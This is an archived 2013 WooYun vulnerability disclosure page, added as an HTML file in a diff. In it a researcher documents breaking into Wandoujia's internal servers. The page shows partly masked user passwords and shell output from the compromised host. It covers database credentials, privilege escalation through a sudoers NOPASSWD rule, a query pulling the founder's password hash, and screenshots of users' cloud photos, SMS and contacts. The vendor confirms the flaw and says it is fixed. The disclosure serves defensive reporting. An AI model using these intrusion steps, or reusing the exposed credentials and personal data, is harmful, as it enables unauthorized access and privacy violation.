@@ -1,0 +1,356 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		豌豆荚边界应用缺陷导致1200万用户数据告急(云端相册 通讯录 短信备份)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		豌豆荚边界应用缺陷导致1200万用户数据告急(云端相册 通讯录 短信备份)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
+</li><li>提交时间：		2013-08-25 15:38</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-14：	细节向普通白帽子公开<br/>
+									2013-09-24：	细节向实习白帽子公开<br/>
+									2013-10-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">上一个漏洞讲了如何获取用户的COOKIE来浏览用户的数据<br />
+本漏洞主要介绍如何利用上个漏洞的细节，直接全面ROOT豌豆荚内网所有服务器的细节<br />
+<br />
+最终成功实现可浏览1200万注册用户中的任意豌豆荚用户备份在云端的信息，并能通过应用推送功能，直接往用户的手机客户端植入任意安卓后门。<br />
+<br />
+本报告证明了云计算，大数据这种玩意儿信息太过集中，并不安全！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 开始<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-035192">WooYun: 豌豆荚主站某频道设计缺陷 可间接攻击关联系统</a> <br />
+<br />
+上篇漏洞描述 wandoujia 这个弱口令只是为了突出说明，不代表我的字典没有更多的密码破出其它用户的密码，所以补丁的时候切记不要看到弱口令就简单的把那个密码修改掉。<br />
+<br />
+这里再列两个用户的密码：<br />
+<br />
+</p><pre><code>ch[马赛克]ang:123456<br />
+tester:testtest</code></pre><p class='detail'><br />
+<br />
+#2 getshell<br />
+<br />
+利用wordpress后台自带功能获取shell，细节请看官们自己google<br />
+<br />
+</p><pre><code>[/]$ uname -a<br />
+Linux app175.hy01 2.6.32-279.el6.x86_64 #1 SMP Fri Jun 22 12:19:21 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux<br />
+[/]$ /sbin/ifconfig -a<br />
+em1       Link encap:Ethernet  HWaddr 52:54:00:F1:CC:05  <br />
+          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:1000 <br />
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
+          Interrupt:10 Base address:0xa000 <br />
+<br />
+em2       Link encap:Ethernet  HWaddr 52:54:00:F1:CC:06  <br />
+          inet addr:10.0.25.108  Bcast:10.0.25.255  Mask:255.255.255.0<br />
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
+          RX packets:48282976 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:39910793 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:1000 <br />
+          RX bytes:30070983217 (28.0 GiB)  TX bytes:89248609390 (83.1 GiB)<br />
+<br />
+lo        Link encap:Local Loopback  <br />
+          inet addr:127.0.0.1  Mask:255.0.0.0<br />
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
+          RX packets:3024455 errors:0 dropped:0 overruns:0 frame:0<br />
+          TX packets:3024455 errors:0 dropped:0 overruns:0 carrier:0<br />
+          collisions:0 txqueuelen:0 <br />
+          RX bytes:7671500625 (7.1 GiB)  TX bytes:7671500625 (7.1 GiB)<br />
+<br />
+<br />
+<br />
+[/]$ last -10<br />
+work     pts/0        10.0.11.11       Thu Aug 22 11:20 - 11:21  (00:01)    <br />
+work     pts/0        10.0.11.11       Wed Aug 21 20:32 - 20:57  (00:24)    <br />
+work     pts/0        10.0.11.11       Wed Aug 21 16:32 - 17:02  (00:30)    <br />
+work     pts/1        10.0.11.11       Wed Aug 21 01:16 - 01:17  (00:00)    <br />
+op       pts/0        10.0.11.11       Wed Aug 21 01:08 - 01:32  (00:23)    <br />
+work     pts/1        10.0.11.11       Mon Aug 19 14:30 - 14:59  (00:28)    <br />
+op       pts/0        10.0.11.11       Mon Aug 19 13:27 - 18:19  (04:51)    <br />
+op       pts/0        10.0.11.11       Mon Aug 19 11:24 - 12:58  (01:33)    <br />
+work     pts/0        10.0.11.17       Mon Aug 19 11:15 - 11:16  (00:01)    <br />
+op       pts/0        10.0.11.11       Mon Aug 19 08:38 - 09:08  (00:29)    <br />
+<br />
+wtmp begins Thu Aug 15 21:01:37 2013</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#3 拿到shell后的内网扩张<br />
+<br />
+</p><pre><code>// ** MySQL settings - You can get this info from your web host ** //<br />
+/** The name of the database for WordPress */<br />
+define(&#039;DB_NAME&#039;, &#039;wd_blog&#039;);<br />
+<br />
+/** MySQL database username */<br />
+define(&#039;DB_USER&#039;, &#039;wd_blog&#039;);<br />
+<br />
+/** MySQL database password */<br />
+define(&#039;DB_PASSWORD&#039;, &#039;wandouji***234&#039;);<br />
+<br />
+/** MySQL hostname */<br />
+define(&#039;DB_HOST&#039;, &#039;10.*.**.38&#039;);<br />
+<br />
+/** Database Charset to use in creating database tables. */<br />
+define(&#039;DB_CHARSET&#039;, &#039;utf8&#039;);<br />
+<br />
+/** The Database Collate type. Don&#039;t change this if in doubt. */<br />
+define(&#039;DB_COLLATE&#039;, &#039;&#039;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+~! 而且这个数据连接用户几乎可以连接到内网所有的mysql服务器，wandouji***234是个通用的密码，权限还特别大，下面看看数据(可直接替换官方APK的下载地址，植入后门)<br />
+<br />
+</p><p class="detail"><a href="../images/2515215429733db7971ca28e8c7f0ff4f7d8bf79.jpg" target="_blank"><img src="../images/2515215429733db7971ca28e8c7f0ff4f7d8bf79.jpg" alt="wandoujia_app_download_url.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#4 说了内网使用通用密码后，还有服务器配置上的缺陷, suoders 设置为NOPASSWD，无需提权即可拥有root权限，替换某些系统服务，截获到root或者其他用户的密钥，整个内网就透明了。<br />
+<br />
+</p><pre><code>[/]$ id<br />
+uid=501(work) gid=501(work) groups=501(work),10(wheel),502(sshusers)<br />
+[/]$ sudo id<br />
+uid=0(root) gid=0(root) groups=0(root),10(wheel),502(sshusers)<br />
+[/]$ sudo crontab -l<br />
+# HEADER: This file was autogenerated at Thu Aug 15 21:02:21 +0800 2013 by puppet.<br />
+# HEADER: While it can still be managed manually, it is definitely not recommended.<br />
+# HEADER: Note particularly that the comments starting with &#039;Puppet Name&#039; should<br />
+# HEADER: not be deleted, as doing so could cause duplicate cron jobs.<br />
+# Puppet Name: puppet<br />
+1,31 * * * * /usr/bin/puppet agent --onetime --no-daemonize --server=puppet.corp.wandoujia.com&gt; /dev/null 2&gt;&amp;1<br />
+[/]$ sudo tail /root/.bash_history<br />
+#1377088572<br />
+ll -rhlt <br />
+#1377088578<br />
+ll wp-a<br />
+#1377088579<br />
+ps -ef <br />
+#1377088583<br />
+ps -ef |grep nginx <br />
+#1377088586<br />
+ll -rhlt <br />
+<br />
+[/]$ sudo cat /etc/sudoers<br />
+## Allows members of the users group to mount and unmount the <br />
+## cdrom as root<br />
+# %users  ALL=/sbin/mount /mnt/cdrom, /sbin/umount /mnt/cdrom<br />
+<br />
+## Allows members of the users group to shutdown this system<br />
+# %users  localhost=/sbin/shutdown -h now<br />
+<br />
+## Read drop-in files from /etc/sudoers.d (the # here does not mean a comment)<br />
+#includedir /etc/sudoers.d<br />
+work   ALL = NOPASSWD: /etc/init.d/nginx *</code></pre><p class='detail'><br />
+<br />
+#5 直接去找account用户服务器<br />
+<br />
+通过获取到的密钥，直接登录app86.hy01.wandoujia.com (10.0.23.40)用户信息服务器，发现一个account-api.war的包，直接解开找到用户信息数据库连接信息。<br />
+<br />
+</p><pre><code>&lt;!-- 数据源配置,使用应用内的DBCP数据库连接池 --&gt;<br />
+	&lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;<br />
+		destroy-method=&quot;close&quot;&gt;<br />
+		&lt;!-- Connection Info --&gt;<br />
+		&lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;<br />
+<br />
+		&lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://192.**.*.***/new_account?useUnicode=true&amp;amp;characterEncoding=utf-8&quot; /&gt;<br />
+		&lt;property name=&quot;username&quot; value=&quot;account&quot; /&gt;<br />
+		&lt;property name=&quot;password&quot; value=&quot;accoun******1&quot; /&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#6 接触用户数据<br />
+<br />
+查询wandoujia.com的WHOIS信息，得知创始人邮箱为: wangjunyu@gmail.com<br />
+<br />
+http://whois.chinaz.com/wandoujia.com<br />
+<br />
+~! new_account<br />
+<br />
+</p><pre><code>select password,salt,email from account where email = &#039;wangjunyu@gmail.com&#039;<br />
+a10b76bad8b0fcb******26894dce98b,6303,wangjunyu@gmail.com</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+后面直接用某个@wandoujia.com的用户测试访问云端数据。<br />
+<br />
+<br />
+<br />
+#7 用户数据大泄露<br />
+<br />
+<br />
+<br />
+~! 云相册<br />
+<br />
+</p><p class="detail"><a href="../images/25153318caae7a4c0801a8d1eb2f50a791ffb099.jpg" target="_blank"><img src="../images/25153318caae7a4c0801a8d1eb2f50a791ffb099.jpg" alt="wandoujia_云相册.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+~! 云短信<br />
+<br />
+</p><p class="detail"><a href="../images/25153349ed95bb15d8b86480d6a46329ef86774a.jpg" target="_blank"><img src="../images/25153349ed95bb15d8b86480d6a46329ef86774a.jpg" alt="wandoujia_云短信.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+~! 云推送应用<br />
+<br />
+</p><p class="detail"><a href="../images/251534147410035c8c7c613ba3da3ff09661e4f5.jpg" target="_blank"><img src="../images/251534147410035c8c7c613ba3da3ff09661e4f5.jpg" alt="wandoujia_在线推送.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+~! 云通讯录，找到豌豆荚创始人手机号<br />
+<br />
+</p><p class="detail"><a href="../images/25153438d51e1bcb89d7b88defa45225bceb86eb.jpg" target="_blank"><img src="../images/25153438d51e1bcb89d7b88defa45225bceb86eb.jpg" alt="wandoujia_云通讯录.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">#1 云的东西很集中，并不安全。<br />
+<br />
+#2 不要只是看到表面的现象，就觉得问题不严重。<br />
+<br />
+#3 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。<br />
+<br />
+#4 补丁不要只补在表面，应该更深入的思考防护策略。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035257" title="豌豆荚边界应用缺陷导致1200万用户数据告急(云端相册 通讯录 短信备份)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-08-25 16:23</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">确实是很严重的漏洞，感谢爆料~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-10-15：本漏洞已经于 8.26 日凌晨修复，谢谢大家的关注。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35257";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
